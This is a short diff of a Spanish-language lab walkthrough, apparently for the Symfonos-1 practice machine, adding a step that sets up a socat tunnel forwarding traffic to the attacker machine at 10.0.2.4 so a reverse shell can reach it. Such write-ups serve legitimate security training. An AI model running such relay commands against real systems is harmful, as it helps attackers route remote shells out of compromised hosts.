@@ -772,7 +772,12 @@ ahora debemos solo debemos enviarnos una shell a nuestra maquina de atacante. pa
 
 `Paso-1`
 ```python
+crear un tunel con socat por el cual nuestra peticion viajara desde la maquina Symfonos-1 hacia la maquina Attack
+
+./socat TCP-LISTEN:3232,fork TCP:10.0.2.4:6060
 
 ```
 
 ![[Pasted image 20240622201412.png]]
+
+`Paso-2`
